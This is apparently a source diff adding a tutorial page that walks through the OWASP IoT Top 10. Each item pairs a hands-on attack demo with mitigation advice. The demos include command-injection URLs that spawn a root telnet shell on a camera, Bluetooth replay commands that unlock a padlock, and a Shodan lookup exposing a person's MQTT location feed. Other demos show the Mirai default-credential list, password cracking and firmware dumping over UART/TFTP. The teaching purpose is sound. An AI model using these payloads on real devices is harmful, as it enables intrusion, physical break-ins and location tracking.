@@ -1,0 +1,495 @@
+:markdown-it
+	# The IoT Top10 OWASP
+
+	OWASP (Open Web Application Security Projet) is an online community who works on security and webapp security. The main goal is to provide best practices and security guides. Since a few time, IoT takes place on the OWASP website [https://www.owasp.org/index.php/OWASP_Embedded_Application_Security]([https://www.owasp.org/index.php/OWASP_Embedded_Application_Security)
+
+	Remember, a connected object has theses following constraints :
+	* Cost : the object must be the less expensive
+	* Size : the object must stay small and light
+	* Performance : the object must be available and reliable
+	* Autonomy : the object must be able to operate at least 24 hours
+
+	These constraints, added to a very fast time to market, leads to a non-compliance of the entire V-cycle (agility is not a commonplace)
+	
+
+	## TOP 1 : Insecure Web interface
+	The first position is attributed to the discover of vulnerabilities in the Web interface. Here, the impact is more important than other because these interfaces are directly interacting with the user (or attacker of course).
+	
+	In this example, a security camera, connected to the local network, broadcast a web interface on the port 80.
+	The webserver is composed of CGI files, allowing display of web content, retrieval of the users requests (ex.: camera moving, take photo or alert configuration) and then, data transmission to internal drivers (ex.: motors and config files).
+
+	Here, a remote code execution vulnerability allows an attacker to modify the camera behavior. The root cause is the FTP configuration process where the password field doesn't handle correctly user input. An attacker could inject a bash command like **ftp connect** in order to be executed directly on the device.
+
+pre.hljs
+	code
+		:highlight(lang='bash')
+			http://192.168.1.107/setftp.cgi[...]]ser=ftp&pwd=$(ftp test.test)ftp&dir=/
+			http://192.168.1.107/ftptest.cgi[...]inpas=admin
+
+:markdown-it
+	On the camera, when the firmware process given information, it execute the bash **ftp connect** command. A TCPdump allow an attacker to see the connection attempt (DNS request) - the exploit is successfully executed on the device.
+
+pre.hljs
+	code
+		:highlight(lang='bash')
+				00:00:00.151107 IP 192.168.10.10.33551 > 8.8.8.8.53: test.test. (23)
+
+:markdown-it
+	An attacker will be able to start a telnet connection on the port 25 and connect to it.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				user@kali$ wget -qO- 
+				  'http://192.168.1.107/set_ftp.cgi[...]pwd=$(telnetd -p25 -l/bin/sh)&dir=/'
+				user@kali$ wget -qO- 'http://192.168.1.107/ftptest.cgi[...]loginpas=admin'
+
+
+				user@kali$ user@kali$ telnet 192.168.1.107 25
+				Trying 192.168.1.107...
+				Connected to 192.168.1.107.
+				Escape character is '^]'.
+
+				#> id
+				uid=0(root) gid=0telnet 192.168.1.107 25
+				Trying 192.168.1.107...
+				Connected to 192.168.1.107.
+				Escape character is '^]'.
+
+				#> id
+				uid=0(root) gid=0
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+		i.fire.extinguisher.icon
+		.content
+				:markdown-it
+					It is highly recommended to sanitize all user input before processing. More generally, data could be corrupted. A developer could use regular expression of predefined choices to limit attacker injection.
+				
+:markdown-it
+	## TOP 2 : Insecure authenfication and authorisation
+
+	The second step goes to weakness in the authentication process. Here, after a firmware decompilation, an attacker could extract the login source code. The following screenshot shows the bytecode. An attacker could easily identify weakness like incorrect password validation and looping exit condition.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				boolean verifyPIN ( byte [] inputPIN )
+				{
+					for (int i=0; i<correctPIN.length; i++)
+						if ( inputPIN [i] != correctPIN [i] )
+							return false ;
+					return true ;
+				}
+
+:markdown-it
+	The attack is almost simple : just analyse the answering timing. If the first character is wrong, the loop will exit shortly. An attacker could enumerate each character in each position to identify if the character is correct or not. Just replaying the same method on other position in order to detect which caracter is correct. The new complexity will be only to 40 try.
+	
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+			i.fire.extinguisher.icon
+			.content
+					:markdown-it
+							It is recommended to not reinvent a validation algorithm. Using community algorithm should be a relevant solution, mostly because the commmunity has already hardened the security. By the way, a password should never stored in cleartext but in a non-reversible method (ex.: hashed with sha256)
+
+:markdown-it
+	## TOP 3 : Insecure network services
+
+	Some object broadcasts streams without any upstream control. Here, an IP camera connected to the local network broadcast, without authentication, a RSTP video stream on the port 10554.
+	
+	The VLC tool allows an attacker to decode in live the stream.
+
+pre.hljs
+	code
+		:highlight(lang='bash')
+			user@kali$ vlc rstp://192.168.1.107:10554/tcp/av0_1
+
+:markdown-it
+
+	![./img/officeCam.png](./img/officeCam.png)
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+				i.fire.extinguisher.icon
+				.content
+						:markdown-it
+						
+							It is highly recommended to limit to the strict minimum broadcast of unnecessary services and validate the user identication before streaming. Here, the developper could include an authentication at the stream opening (ex.: admin:admin@ip:10554/stream). By the way, the stream should be always encrypted.
+
+:markdown-it
+	## TOP 4 : Encrptyed communication
+
+	In the case of external communications (nearfield, long range, low speed or high speed), some informations are exchanged without protection : especially in confidentiality. Here, an attacker could freely listen a Bluetooth exchange over the air from a smartphone to a padlock.
+	
+	In the following screenshot, an attacker could retrieve device Bluetooth characteristic (Bluetooth services). After analysis, espaciall with Bluetooth logging (hci) on an Android smartphone, an attacker could easily describe each characteristics.
+	
+	* The 0x0026 caracteristic is responsible to padlock notification
+	* The 0x0029 caracteristic is responsible to padlock opening request
+
+pre.hljs
+			code
+				:highlight(lang='bash')
+					Smartphone > Padlock : 0x0026 0100
+					Smartphone > Padlock : 0x0029 554100000014
+					Smartphone > Padlock : 0x0029 55100144
+
+:markdown-it
+	With a simple replay of previous command, an attacker could open the padlock.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				[34:XX:13:XX:5C:XX][LE]> connect 34:XX:13:XX:5C:XX
+						Attempting to connect to 34:XX:13:XX:5C:XX
+						Connection successful
+				[34:XX:13:XX:5C:XX][LE]> char-write-cmd 0x0026 0100
+				[34:XX:13:XX:5C:XX][LE]> char-write-cmd 0x0029 554100000014
+				[34:XX:13:XX:5C:XX][LE]> char-write-cmd 0x0029 55100144
+						Padlock unlocked
+
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+		i.fire.extinguisher.icon
+		.content
+				:markdown-it
+				
+					It is highly recommended to setup a unique challenge during each exchange. A developer could implement a sharing secret between smartphone and padlock. In each opening request, a random number is calculated by the smartphone and crypted by the shared secret before sending to the padlock. This random secret guaranteed the uniqueness of the session.
+
+:markdown-it
+
+	## TOP 5 : Sensitive information exposure
+
+	Some applications and protocols are often implemented and used without taking care of the security layer. Here a smartphone application publishs on a MQTT server the location of his proprietary.
+
+	This application goal is to share, between friends, each people location. The location is published and stored on a dedicated MQTT broker.
+	The MQTT protocol allows, by default, anybody to subscribe to the broacasted topic, without any authentication. A simple Shodan request with the application name allow an attacker to identify vulnerable server and access to smartphone geolocation.
+
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				shodan search o[xxx]ks --fields ip_str --limit 1
+
+				XX1.2XX.2XX.1X9
+
+:markdown-it
+		Shodan automatically lists available topic published on the broker. Here, Brian smartphone publishs his user's location.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				smartthings/bed/level
+				smartthings/bed/switch
+				tele/sonoff_bedroom/LWT
+				tele/sonoff_livingroom/LWT
+				o[xxx]s/brian/iphone
+
+:markdown-it
+	The following screenshot shows an attacker who has subscribed to the Brian location topic /o[xxx]s/brian/iphone and see that he is currently in Norway. 
+	
+pre.hljs
+		code
+			:highlight(lang='json')
+				{
+				  "cog": 286,
+				  "batt": 49,
+				  "lon": 12345678,
+				  "acc": 16,
+				  "p": 99.99998474121094,
+				  "vel": 53,
+				  "vac": 14,
+				  "lat": 12345678,
+				  "conn": "m",
+				  "tst": 1534968426,
+				  "tid": "NE",
+				  "_type": "location",
+				  "alt": 27
+				}
+
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+		i.fire.extinguisher.icon
+		.content
+				:markdown-it
+					It is highly recommended to check that free services do not abusively expose information on the Internet and an authentication process is implemented. The authentication process must validate user identity and limit access to only legitimate users. Some details could be find here :  [https://www.hivemq.com/blog/introducing-the-mqtt-security-fundamentals](https://www.hivemq.com/blog/introducing-the-mqtt-security-fundamentals)
+:markdown-it
+	## I6 : Insecure cloud services
+
+	Some IoT builders wants to simplify the user's story as much as possible. Thus, in the case of VIPCAM camera, a subdomain is booked for each camera. User should only plug the camera, take his browser, point to the printed subdomain and access to the camera. If it is simple for a user, it will be also the same for an attacker.
+	
+	An attacker, without buying the camera, could identify the subdomain name generation algorithm. Indeed, all marketplaces publish promotional pictures : 
+
+	![Site marchand 1](./img/vipcam.png)
+	![site marchand 2](./img/vipcam2.jpg)
+	![site marchand 3](./img/vipcam3.png)
+	
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+			i.fire.extinguisher.icon
+			.content
+					:markdown-it
+						It is highly recommended to put the camera behind a well configured firewall. If the user wants to connect from Internet, a VPN or SSH tunneling should be implemented to secure the exchange. It's cool to simplify the user experience but if the connection is setup on only two steps (ex.: power up the device and flash a QRcode), an attacker will be also connected with only two mouse clics. 
+
+:markdown-it
+	## I7 : Insecure mobile interface
+
+	Some public transport companies wants to be the first to deploy innovations like nearfield payments. Here, the companie deploys on the marketplace a smartphone application to buy and simulate a ticket from the smartphone. Using a decompilation tool like JADX, an attacker could read the bytecode. In this example, the bytecode isn't obfuscated and clearly readable.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				jadx-gui com.app.apk
+
+:markdown-it
+		
+		A nearfield contactess card (NFC card) and a reader exchange information with command and response. This exchange is called APDU. Because the bytecode isn't obfuscated, an attacker could easily reverse enginer the all exchange schema :
+
+pre.hljs
+		code
+			:highlight(lang='java')
+
+				class XXXXXXXInstance extends CardInstance {
+				    protected static final String XXXX_AID = "A000XXXXXXXXXXXXXXXXXXXXXA59XXXX0000";
+				    protected static final String XXXX_SELECT_BY_AID = ("00A40400" + XXXX_AID);
+				    protected static final long deltaTimeMillisTokenExp = TimeUnit.DAYS.toMillis(10);
+				    protected final String CONTRACT = "XX";
+				    protected final String CONTRACT_EXT = "XX";
+				    protected final String CONTRACT_LIST_LID = "XX";
+				    protected final String READ_COUNTER = "9XX2";
+				    protected final String SPECIAL_EVENT_LID = "XX";
+
+				String contract_list = HMPUtils.hexStringToBinaryString(HMPAdvancedFunc.executeAPDU("00")
+					infoElements.add(new InfoElement("eventRouteNumber",
+					HMPUtils.getElementFromBinaryString(journalTransport, index, 16)));
+
+:markdown-it
+	From these information, an attacker could easily craft a custom pirate application in order to say Yes to all reader command.
+
+pre.hljs
+		code
+			:highlight(lang='java')
+				class XXXXXXXInstance extends CardInstance {
+					protected static final String XXXX_AID = "A000XXXXXXXXXXXXXXXXXXXXXA59XXXX0000";
+							
+					if (reader.request == "XXXXXX") {
+							sendAPDU(XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX)
+								....				
+	
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+		i.fire.extinguisher.icon
+		.content
+				:markdown-it
+					It is highly recommended to protect all secrets during runtime and storage. Theses informations should never be easily accessed by an attacker, especially with label. When all information are protected and bytecode obfuscated, there are some tools and custom hardware to retreive exchange (like Proxmark3). An attacker must put his tool between a real reader and his custom application. The bus-driver or securiy camera should detect and companie percecute the attacker.
+
+:markdown-it
+	## I8 : Insecure configuration
+	
+	By default, the device configuration is set with a well-known password. An attacker could try a successfully connection with a little dictionnary. Here, we will focus on Mirai virus. As a reminder, this virus infects security camera because of adminstrators (or users) never modify default password. The following screenshot shows the default password dictonnary embedded in the virus bytecode.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				cat mirai_creds.txt
+
+				root:xc3511
+				root:vizxv
+				root:admin
+				admin:admin
+				root:888888
+				root:xmhdipc
+				root:default
+				root:juantech
+				root:123456
+				root:54321
+				support:support
+		
+:markdown-it
+		
+		A linked vulnerability (could be named also backdoor), is that the device firmware is run in readonly mode. An administrator couldn't modify the root password with a secure one. The following screenshot shows that the device refused to modify the root password. Moreover, unsecured telnet connection is the fast way to administrate the device.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+					$ telnet X.X.X.X
+					Trying X.X.X.X...
+					Connected to X.X.X.X.
+					Escape character is '^]'.
+					LocalHost login: root
+					Password:
+					Welcome to a Poor Security Cam :)
+					# passwd
+					-sh: passwd: not found
+					# cat /etc/passwd
+					root:$1$RYI[...]JwGjRy.B0:0:0:root:/:/bin/sh
+					# touch /etc/passwd
+					touch: /etc/passwd: Read-only file system
+
+
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+		i.fire.extinguisher.icon
+		.content
+				:markdown-it
+						It is highly recommended to consider best practices from the design stage. Leave a default password or a backdoor should clearly hurt the final user. The best practice is to set a custom random password and print it in the package. Don't try to force an enrollment of the user for retrieving root password like some Xiaomi routers. Don't ignore the user experience.
+
+:markdown-it
+
+	## I9 : Insecure firmware and software.
+
+	From a simple research on the support website, an attacker could download the firmware and analyse it deeper. Binwalk tool allows, from an entropic analysis to list all detected filesystem and partition. In the following screenshot, a JFFS2 filesystem has been identified. The Jefferson tool (https://github.com/sviehb/jefferson) allows an attacker to extract all archive content.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				#binwalk firmware.pkg
+
+				DECIMAL       HEXADECIMAL     DESCRIPTION
+				--------------------------------------------------------------------------------
+				144           0x90            JFFS2 filesystem, little endian
+			
+				#jefferson firmware.pkg -d out
+
+				dumping fs #1 to /out/fs_1
+				Jffs2_raw_dirent count: 684
+				Jffs2_raw_inode count: 4728
+				Jffs2_raw_summary count: 0
+				Jffs2_raw_xattr count: 0
+				Jffs2_raw_xref count: 0
+				[...]
+		
+:markdown-it
+	
+	The firmware is composed of a linux architecture (/etc/, /var/ and /bin/). The goal is to identify the hardcoded root password. Obviously, **/etc/passwd** and **/etc/shadow** should be the right way. The password is encrypted and could be easily cracked with the JohnTheRipper tool. A custom dictonnary like "rockyou" should be used, but in many IoT case, it is useless.
+
+pre.hljs
+		code
+			:highlight(lang='bash')
+				cat /etc/passwd
+				root:$1$$qRP[...]by/:0:0::/root:/bin/sh
+
+				john pass.txt --show
+						root:admin
+				1 password hash cracked, 0 left
+					
+:markdown-it
+	An attacker sould now retreive usefull information like :
+	* Source code : ls -la /mnt/webapp/
+	* Startup scripts : find / -name *.sh
+	* Binaries : ls -la /bin/
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+			i.fire.extinguisher.icon
+			.content
+					:markdown-it
+						It is highly recommended to implement in each publicly accessible firmware, a cryptographic protection. Please developpers, don't reinvent a custom implementation and reuse community source code.
+
+:markdown-it
+	## I10 : Physical issues
+	
+	In this chapter, the physical security will be analysed. Easy access to a debug port (like UART) allows an attacker to be prompted by a shell.
+	At the device startup, the bootloader is launched. Trying escape, enter, q or space should stop the booting process and prompt a usefull shell.
+
+pre.hljs
+	code
+		:highlight(lang='bash')
+				Bootloader
+				W90N745 Boot Loader [ Version 11.1 $Revision: 1 $ ] Rebuilt on Jun 19 2006
+				Memory Size is 0x800000
+				Bytes, Flash Size is 0x400000
+					
+:markdown-it
+		From this shell, an attacker should list all available services : especially the TFTP process. This protocol allows to download the firmware from a server and put it directly in RAM. This is used in manufacture to download automatically the most recent firmware on the device before packaging.
+		
+		The TFTP tool has a download and also an upload function. After taking a boot shell, an attacker could setup a custom TFTP server and try to upload all memory to his server, byte per byte. The following screenshot shows the attack.
+	
+pre.hljs
+	code
+		:highlight(lang='bash')
+			
+				## TFTP server setup
+				apt-get install tftp-hpa
+
+				## TFTP listenner configuration on the attacker server
+				TFTP_USERNAME="tftp"
+				TFTP_DIRECTORY="/srv/tftp"
+				TFTP_ADDRESS="0.0.0.0:69"
+				TFTP_OPTIONS="-c -s"
+
+				/etc/init.d/tftp-hpa restart
+
+				## TFTP server configuration on the camera
+				setenv ipaddr = xxx
+				setenv gatewayip = xxx
+				setenv serverip = xxxx
+
+				## Firmware exporting, byte per byte
+				sf probe 0
+				sf read 0x82000000 0x40000 0x370000
+				tftp 0x82000000 romfs.cramfs 0x370000
+
+				hisilicon # tftp 0x82000000 romfs.cramfs 0x370000
+				Hisilicon ETH net controler
+				miiphy_register: non unique device name '0:1'
+				miiphy_register: non unique device name '0:2'
+				MAC:   00-XX-16-XX-21-XX
+				UP_PORT : phy status change : LINK=UP : DUPLEX=FULL : SPEED=100M
+				TFTP to server 192.168.0.11; our IP address is 192.168.0.10
+				Upload Filename 'romfs.cramfs'.
+				Upload from address: 0x82000000, 3.448 MB to be send ...
+				Uploading: #    [ Connected ]
+			 	>>>>> 3.448 MB upload ok.
+
+:markdown-it
+	
+	The firmware is extracted in cleartext and should easily be analysed by previous described method (binwalk and JohnTheRipper)
+
+pre.hljs
+	code
+		:highlight(lang='bash')
+
+				$>/srv/tftp# binwalk firmware 
+
+				DECIMAL       HEXADECIMAL     DESCRIPTION
+				--------------------------------------------------------------------------------
+				9440          0x24E0          LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: -1 bytes
+				262144        0x40000         CramFS filesystem, little endian, size: 3510272 version 2 sorted_dirs CRC 0xE9959B5C, edition 0, 1313 blocks, 163 files
+				...
+				3785400       0x39C2B8        Zlib compressed data, default compression
+				3785428       0x39C2D4        Zlib compressed data, default compression
+							
+				
+				dd if=firmware of=boot bs=1 skip=9440 count=252704
+				dd if=firmware of=romfs bs=1 skip=3866624 count=2621440
+				dd if=firmware of=web bs=1 skip=6488064 count=1310720	
+				...
+				dd if=firmware of=last bs=1 skip=8255636
+				
+				Strings
+				root:x:0:0:root:/root:/bin/bash
+				sync:x:4:65534:sync:/bin:/bin/sync
+				admin:x:9:9:news:/xxxxx:/bin/sh
+				camera:x:10:10:uucp:/var/spxxxxxx:/bin/shfs
+											
+:markdown-it
+	Another example is a Bluetooth light. The device use an Arduino Atmega328p chip to control light, color and Bluetooth communication with the smartphone application. The following screenshot shows the PCB. As we can see, USB labelled 3 pins should be a UART connection. 
+	
+	![puce Atmega328p](./img/pcb.png)
+	
+	A datasheet reading confirm that it is an UART connection
+	
+	![Atmega datasheet](./img/atmegaDatasheet.png)
+	
+	The tool **Avrdude** is able to dump the Atmega328p content. The following screenshot shows the shell command.
+	
+pre.hljs
+	code
+		:highlight(lang='bash')
+			avrdude -F -v -patmega328p -carduino -P/dev/tty/ACM0 -b115200 -D -Uflash:r:program.bin:r
+			
+:markdown-it
+	From a hexdump of the binary file, the source code is readable and hardcoded password could be retreived : 
+	
+	![](./img/getPwdFromCode.png)
+
+.ui.icon.message.red(style='margin-bottom:0.6cm;')
+			i.fire.extinguisher.icon
+			.content
+					:markdown-it
+						It is highly recommended to limit physical access to the PCB and implement a fuse production process (debug port will be unsuable). Moreover, all firmware should be stored always encrypted. The decryption process will be done on the device, directly in memory.
